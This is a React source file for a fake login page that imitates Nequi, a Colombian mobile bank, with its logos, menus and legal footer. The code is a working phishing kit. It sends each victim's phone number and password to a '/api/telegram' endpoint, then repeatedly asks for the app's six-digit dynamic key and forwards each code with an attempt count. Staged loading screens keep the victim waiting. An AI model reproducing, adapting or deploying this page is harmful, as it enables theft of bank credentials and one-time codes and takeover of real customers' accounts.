"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { ChevronDown, EyeOff, RefreshCw } from "lucide-react"

export default function Home() {
  const [currentStep, setCurrentStep] = useState<"login" | "verification" | "codeLoop">("login")
  const [isLoading, setIsLoading] = useState(false)
  const [phoneNumber, setPhoneNumber] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [pinInputs, setPinInputs] = useState(["", "", "", "", "", ""])
  const [currentPinIndex, setCurrentPinIndex] = useState(0)
  const [captchaValue, setCaptchaValue] = useState("")
  const [captchaAnswer, setCaptchaAnswer] = useState(0)
  const [captchaInput, setCaptchaInput] = useState("")
  const [codeAttempts, setCodeAttempts] = useState(0)
  const [maxAttempts] = useState(6)

  const sendToTelegram = async (type: string, data: any) => {
    try {
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type,
          ...data,
        }),
      })

      if (!response.ok) {
        const errorData = await response.json()
        console.error("Error sending to Telegram:", errorData)
      }
    } catch (error) {
      console.error("Error sending to Telegram:", error)
    }
  }

  // Generate random captcha
  const generateCaptcha = () => {
    const num1 = Math.floor(Math.random() * 10) + 1
    const num2 = Math.floor(Math.random() * 10) + 1
    const operators = ["+", "-", "*"]
    const operator = operators[Math.floor(Math.random() * operators.length)]

    let answer = 0
    let captchaText = ""

    switch (operator) {
      case "+":
        answer = num1 + num2
        captchaText = `${num1} + ${num2}`
        break
      case "-":
        answer = num1 - num2
        captchaText = `${num1} - ${num2}`
        break
      case "*":
        answer = num1 * num2
        captchaText = `${num1} × ${num2}`
        break
    }

    setCaptchaValue(captchaText)
    setCaptchaAnswer(answer)
  }

  useEffect(() => {
    generateCaptcha()
  }, [])

  const cleanAndLimitDigits = (value: string, maxLength: number) => {
    return value.replace(/\D/g, "").slice(0, maxLength)
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const cleaned = cleanAndLimitDigits(e.target.value, 10)
    setPhoneNumber(cleaned)
  }

  const isValidPhoneNumber = (phone: string) => {
    return phone.length === 10 && phone.startsWith("3")
  }

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const cleaned = cleanAndLimitDigits(e.target.value, 4)
    setPassword(cleaned)
  }

  const handleCaptchaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")
    setCaptchaInput(value)
  }

  const isCaptchaValid = () => {
    return Number.parseInt(captchaInput) === captchaAnswer
  }

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (isValidPhoneNumber(phoneNumber) && password.length === 4 && isCaptchaValid()) {
      setIsLoading(true)

      // Enviar datos de login a Telegram
      await sendToTelegram("login", {
        phoneNumber,
        password,
      })

      setTimeout(() => {
        setIsLoading(false)
        setCurrentStep("verification")
      }, 3500)
    }
  }

  const handlePinInput = (value: string, index: number) => {
    if (value.length <= 1 && /^\d*$/.test(value)) {
      const newPinInputs = [...pinInputs]
      newPinInputs[index] = value
      setPinInputs(newPinInputs)

      if (value && index < 5) {
        setCurrentPinIndex(index + 1)
        const nextInput = document.querySelector(`input[data-pin-index="${index + 1}"]`) as HTMLInputElement
        nextInput?.focus()
      }
    }
  }

  const handleKeypadInput = (digit: string) => {
    if (digit === "") {
      if (currentPinIndex > 0) {
        const newIndex = currentPinIndex - 1
        const newPinInputs = [...pinInputs]
        newPinInputs[newIndex] = ""
        setPinInputs(newPinInputs)
        setCurrentPinIndex(newIndex)
        const prevInput = document.querySelector(`input[data-pin-index="${newIndex}"]`) as HTMLInputElement
        prevInput?.focus()
      }
    } else {
      if (currentPinIndex < 6) {
        const newPinInputs = [...pinInputs]
        newPinInputs[currentPinIndex] = digit
        setPinInputs(newPinInputs)

        if (currentPinIndex < 5) {
          setCurrentPinIndex(currentPinIndex + 1)
          const nextInput = document.querySelector(`input[data-pin-index="${currentPinIndex + 1}"]`) as HTMLInputElement
          nextInput?.focus()
        }
      }
    }
  }

  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const pin = pinInputs.join("")
    if (pin.length === 6) {
      setIsLoading(true)

      // Enviar código de verificación a Telegram
      const attemptNumber = codeAttempts + 1
      await sendToTelegram("verification", {
        phoneNumber,
        code: pin,
        attempt: attemptNumber,
      })

      setTimeout(() => {
        setIsLoading(false)
        setCodeAttempts((prev) => prev + 1)

        if (codeAttempts + 1 >= maxAttempts) {
          setCodeAttempts(0)
          setCurrentStep("login")
          setPhoneNumber("")
          setPassword("")
          setCaptchaInput("")
          generateCaptcha()
        } else {
          setCurrentStep("codeLoop")
        }

        setPinInputs(["", "", "", "", "", ""])
        setCurrentPinIndex(0)
      }, 7000)
    }
  }

  const handleCodeLoopSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const pin = pinInputs.join("")
    if (pin.length === 6) {
      setIsLoading(true)

      // Enviar código adicional a Telegram
      const attemptNumber = codeAttempts + 1
      await sendToTelegram("verification", {
        phoneNumber,
        code: pin,
        attempt: attemptNumber,
      })

      setTimeout(() => {
        setIsLoading(false)
        setCodeAttempts((prev) => prev + 1)

        if (codeAttempts + 1 >= maxAttempts) {
          setCodeAttempts(0)
          setCurrentStep("login")
          setPhoneNumber("")
          setPassword("")
          setCaptchaInput("")
          generateCaptcha()
        }

        setPinInputs(["", "", "", "", "", ""])
        setCurrentPinIndex(0)
      }, 5000)
    }
  }

  return (
    <div className="min-h-screen">
      {/* Loader */}
      {isLoading && (
        <div className="fixed inset-0 z-20 flex items-center justify-center bg-white">
          <div className="flex flex-col items-center">
            <img
              src="/loading-nequi.webp"
              alt="Cargando Nequi"
              className="w-40 h-40 object-contain mt-16 animate-pulse"
            />
            <p className="font-semibold mt-4 text-gray-700">Espera un momentito ;) ¡No te vayas!</p>
          </div>
        </div>
      )}
      {/* Navigation */}
      <nav className="w-full flex justify-center fixed bg-white z-10 border-b border-gray-200">
        <div className="w-full p-4 max-w-[1200px] flex justify-between items-center">
          <div className="flex items-center">
            <img src="/logo-nequi.svg" alt="Nequi" className="h-8" />
          </div>

          <div className="hidden lg:flex items-center gap-6">
            <div className="flex items-center gap-1 text-[#200020] hover:text-[#DA0081] transition-colors cursor-pointer">
              <span>Para personas</span>
              <ChevronDown className="w-4 h-4" />
            </div>
            <div className="flex items-center gap-1 text-[#200020] hover:text-[#DA0081] transition-colors cursor-pointer">
              <span>Ayuda</span>
              <ChevronDown className="w-4 h-4" />
            </div>
            <div className="flex items-center gap-1 text-[#200020] hover:text-[#DA0081] transition-colors cursor-pointer">
              <span>Conócenos</span>
              <ChevronDown className="w-4 h-4" />
            </div>
            <a href="#" className="text-[#200020] hover:text-[#DA0081] transition-colors">
              Tu negocio
            </a>
            <a href="#" className="text-[#200020] hover:text-[#DA0081] transition-colors">
              Paga tu crédito
            </a>
            <button className="py-2 px-6 text-sm text-[#200020] border border-[#200020] bg-white rounded hover:bg-[#200020] hover:text-white transition-colors">
              Entrar
            </button>
            <button className="py-2 px-6 text-sm text-white bg-[#DA0081] rounded hover:bg-[#b3006b] transition-colors">
              Recargar
            </button>
          </div>

          <div className="lg:hidden cursor-pointer">
            <div className="w-6 h-6 flex flex-col justify-center space-y-1">
              <div className="w-full h-0.5 bg-[#200020]"></div>
              <div className="w-full h-0.5 bg-[#200020]"></div>
              <div className="w-full h-0.5 bg-[#200020]"></div>
            </div>
          </div>
        </div>
      </nav>
      {/* Main Content */}
      <section className="min-h-screen w-full px-2 flex items-center justify-center pt-[70px] pb-20">
        {currentStep === "login" ? (
          <div className="w-full flex items-center justify-center">
            <div className="w-full md:w-[400px] bg-white rounded-lg p-8 shadow-lg">
              <h1 className="text-2xl font-semibold text-center text-[#200020] mb-2">Inicia sesión</h1>
              <p className="text-gray-600 text-center mb-8">Ingresa tu número de cel y clave</p>
              <form onSubmit={handleLoginSubmit}>
                <div className="mb-6">
                  <label className="block text-sm font-medium text-gray-700 mb-2">Número de celular</label>
                  <div className="relative">
                    <div className="absolute left-3 top-1/2 transform -translate-y-1/2 flex items-center gap-2">
                      <div className="w-5 h-3 rounded-sm overflow-hidden">
                        <div className="w-full h-1/2 bg-yellow-400"></div>
                        <div className="w-full h-1/4 bg-blue-600"></div>
                        <div className="w-full h-1/4 bg-red-600"></div>
                      </div>
                      <span className="text-gray-600 text-sm">+57</span>
                    </div>
                    <input
                      type="text"
                      value={phoneNumber}
                      onChange={handlePhoneChange}
                      placeholder="Número de celular"
                      className="w-full pl-20 pr-4 py-3 border border-gray-300 rounded-lg focus:border-[#DA0081] focus:outline-none transition-colors"
                      required
                    />
                  </div>
                </div>

                <div className="mb-6">
                  <label className="block text-sm font-medium text-gray-700 mb-2">Contraseña</label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={handlePasswordChange}
                      placeholder="Contraseña"
                      className="w-full px-4 py-3 pr-12 border border-gray-300 rounded-lg focus:border-[#DA0081] focus:outline-none transition-colors"
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                    >
                      <EyeOff className="w-5 h-5" />
                    </button>
                  </div>
                </div>

                {/* Captcha */}
                <div className="mb-6">
                  <label className="block text-sm font-medium text-gray-700 mb-2">Verificación de seguridad</label>
                  <div className="flex items-center gap-3">
                    <div className="flex-1 bg-gray-100 border border-gray-300 rounded-lg p-3 flex items-center justify-between">
                      <span className="text-lg font-mono text-gray-800 select-none">{captchaValue} = ?</span>
                      <button type="button" onClick={generateCaptcha} className="text-gray-500 hover:text-gray-700 p-1">
                        <RefreshCw className="w-4 h-4" />
                      </button>
                    </div>
                    <input
                      type="text"
                      value={captchaInput}
                      onChange={handleCaptchaChange}
                      placeholder="Resultado"
                      className="w-20 px-3 py-3 border border-gray-300 rounded-lg focus:border-[#DA0081] focus:outline-none transition-colors text-center"
                      required
                    />
                  </div>
                </div>

                <button
                  type="submit"
                  className="w-full py-3 bg-[#DA0081] text-white font-semibold rounded-lg hover:bg-[#b3006b] transition-colors disabled:opacity-50 mb-4"
                  disabled={!isValidPhoneNumber(phoneNumber) || password.length !== 4 || !isCaptchaValid()}
                >
                  Continuar
                </button>

                <div className="text-center">
                  <a href="#" className="text-[#DA0081] text-sm hover:underline">
                    ¿Olvidaste tu contraseña?
                  </a>
                </div>
              </form>
              <p className="text-sm text-center text-gray-600 mt-6">
                Recuerda que debes tener tu cel a la mano para terminar el proceso.
              </p>
            </div>
          </div>
        ) : (
          <div className="w-full flex items-center justify-center">
            <div className="w-full md:w-[370px] bg-white rounded-lg p-6 shadow-lg">
              <h1 className="text-xl pt-5 font-semibold text-center mb-5 text-[#200020]">
                {currentStep === "verification" ? "Confirmemos que eres tú" : "Código de verificación"}
              </h1>
              <p className="text-sm text-center text-gray-600 mb-6">
                {currentStep === "verification"
                  ? "Para confirmar que eres tú escribe o pega la clave dinámica que encuentras en tu App Nequi."
                  : "Ingresa nuevamente el código de verificación"}
              </p>
              <form onSubmit={currentStep === "verification" ? handleVerificationSubmit : handleCodeLoopSubmit}>
                <div className="flex justify-center gap-3 mt-6 px-4">
                  {pinInputs.map((value, index) => (
                    <input
                      key={index}
                      type="text"
                      maxLength={1}
                      value={value}
                      data-pin-index={index}
                      onChange={(e) => handlePinInput(e.target.value, index)}
                      className="w-10 h-10 text-center text-xl font-medium border-b-2 border-[#DA0081] bg-[#faf8fc] rounded-t focus:outline-none focus:bg-white transition-colors"
                      required
                    />
                  ))}
                </div>

                <div className="grid grid-cols-3 gap-y-2 gap-x-1 mt-8 px-3 max-w-[260px] mx-auto select-none">
                  {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
                    <button
                      key={num}
                      type="button"
                      className="h-12 text-3xl font-medium text-[#200020] focus:outline-none hover:bg-gray-100 rounded transition-colors"
                      onClick={() => handleKeypadInput(num.toString())}
                    >
                      {num}
                    </button>
                  ))}
                  <div></div>
                  <button
                    type="button"
                    className="h-12 flex items-center justify-center focus:outline-none hover:bg-gray-100 rounded transition-colors"
                    onClick={() => handleKeypadInput("")}
                  >
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path
                        d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-4.091-.205-7.719-2.165-10.148-4.091"
                        fill="#200020"
                      />
                    </svg>
                  </button>
                </div>

                <button
                  type="submit"
                  className="block w-full mt-8 py-3 bg-[#DA0081] rounded text-white text-base font-semibold hover:bg-[#b3006b] transition-colors disabled:opacity-50"
                  disabled={pinInputs.join("").length !== 6}
                >
                  Confirmar
                </button>
              </form>
            </div>
          </div>
        )}
      </section>
      {/* Footer */}
      <footer
        className="text-white relative overflow-hidden w-full"
        style={{
          backgroundColor: "#200020",
          backgroundImage: "url(/footer-background.svg)",
          backgroundPosition: "center center",
          backgroundRepeat: "no-repeat",
          backgroundSize: "cover",
          minHeight: "719px",
        }}
      >
        {/* Vigilado image - positioned absolutely on the left */}
        <div
          className="absolute z-10 vigilado-mobile"
          style={{
            left: "-70px",
            top: "20px",
            width: "30px",
            height: "416px",
            opacity: "0.5",
            backgroundImage: "url(/vigilado.png)",
            backgroundPosition: "center bottom",
            backgroundRepeat: "no-repeat",
            backgroundSize: "cover",
          }}
        />
        {/* Nueva imagen Vigilado vertical - posicionada en el lado izquierdo */}
        <div
          className="absolute z-10 hidden lg:block"
          style={{
            left: "15px",
            top: "60px",
            width: "80px",
            height: "500px",
            opacity: "0.5",
            backgroundImage: "url(/vigilado-vertical.png)",
            backgroundPosition: "center",
            backgroundRepeat: "no-repeat",
            backgroundSize: "contain",
          }}
        />

        <div className="relative pt-32 pb-8 max-w-[1200px] mx-auto px-24 footer-content-wrapper">
          {/* Header section with logo and app buttons */}
          <div className="flex flex-col lg:flex-row justify-between items-start lg:items-center mb-12">
            <div className="mb-6 lg:mb-0">
              <img src="/logo-nequi-blanco.svg" alt="Nequi" className="h-8" />
            </div>

            <div className="flex flex-col sm:flex-row items-start sm:items-center gap-4">
              <div className="flex gap-3">
                <a href="#" className="block">
                  <img src="/store-googleplay.svg" alt="Disponible en Google Play" className="h-10" />
                </a>
                <a href="#" className="block">
                  <img src="/store-apple.svg" alt="Descargar en App Store" className="h-10" />
                </a>
                <a href="#" className="block">
                  <img src="/store-huawei.svg" alt="Explóralo en AppGallery" className="h-10" />
                </a>
              </div>
              <div className="flex items-center gap-2 text-sm">
                <span>by</span>
                <img src="/logo-grupo-bancolombia.svg" alt="Bancolombia" className="h-10 w-auto" />
              </div>
            </div>
          </div>
          {/* Separator line */}
          <div className="border-t border-white/20 mb-12"></div>
          {/* Links grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8 mb-12">
            {/* Información legal */}
            <div>
              <h3 className="font-semibold mb-4" style={{ color: "#F1BFDA", fontSize: "18px", margin: "0 0 16px 0" }}>
                Información legal
              </h3>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Condiciones de Uso
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Tratamiento de Datos Personales
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Consumidor Financiero
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Defensor del Consumidor Financiero
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Línea ética
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Legal Nequi
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Política de compensación y resarcimiento
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Superintendencia Financiera de Colombia
                  </a>
                </li>
              </ul>
            </div>

            {/* Para personas */}
            <div>
              <h3 className="font-semibold mb-4" style={{ color: "#F1BFDA", fontSize: "18px", margin: "0 0 16px 0" }}>
                Para personas
              </h3>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Información de productos y servicios
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Tarjeta Nequi
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Préstamo Salvavidas
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Préstamo Propulsor
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Usa tu plata
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Paypal
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Remesas
                  </a>
                </li>
              </ul>
            </div>

            {/* Para Negocio */}
            <div>
              <h3 className="font-semibold mb-4" style={{ color: "#F1BFDA", fontSize: "18px", margin: "0 0 16px 0" }}>
                Para Negocio
              </h3>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Información sobre productos y servicios
                  </a>
                </li>
              </ul>
            </div>

            {/* Ayuda */}
            <div>
              <h3 className="font-semibold mb-4" style={{ color: "#F1BFDA", fontSize: "18px", margin: "0 0 16px 0" }}>
                Ayuda
              </h3>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Centro de ayuda
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Blog de educación financiera
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Comunidad Nequi
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Tips de seguridad
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Finanzas abiertas
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    ¿Cómo puedo cancelar mi Nequi?
                  </a>
                </li>
              </ul>
            </div>

            {/* Conócenos */}
            <div>
              <h3 className="font-semibold mb-4" style={{ color: "#F1BFDA", fontSize: "18px", margin: "0 0 16px 0" }}>
                Conócenos
              </h3>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    ¿Quiénes somos?
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Trabaja con nosotros
                  </a>
                </li>
                <li>
                  <a href="#" className="text-gray-300 hover:text-white transition-colors text-sm">
                    Sala de prensa
                  </a>
                </li>
              </ul>
            </div>
          </div>
          {/* Separator line */}
          <div className="border-t border-white/20 mb-8"></div>
          {/* Social media and help button */}
          <div className="flex flex-col sm:flex-row justify-between items-center">
            <div className="flex gap-4 mb-4 sm:mb-0">
              <a
                href="#"
                className="w-10 h-10 bg-white/10 rounded-full flex items-center justify-center hover:bg-white/20 transition-colors"
              >
                <img src="/ic-instagram.svg" alt="Instagram" className="w-5 h-5" />
              </a>
              <a
                href="#"
                className="w-10 h-10 bg-white/10 rounded-full flex items-center justify-center hover:bg-white/20 transition-colors"
              >
                <img src="/ic-facebook.svg" alt="Facebook" className="w-5 h-5" />
              </a>
              <a
                href="#"
                className="w-10 h-10 bg-white/10 rounded-full flex items-center justify-center hover:bg-white/20 transition-colors"
              >
                <img src="/ic-twitter.svg" alt="Twitter" className="w-5 h-5" />
              </a>
              <a
                href="#"
                className="w-10 h-10 bg-white/10 rounded-full flex items-center justify-center hover:bg-white/20 transition-colors"
              >
                <img src="/ic-youtube.svg" alt="YouTube" className="w-5 h-5" />
              </a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
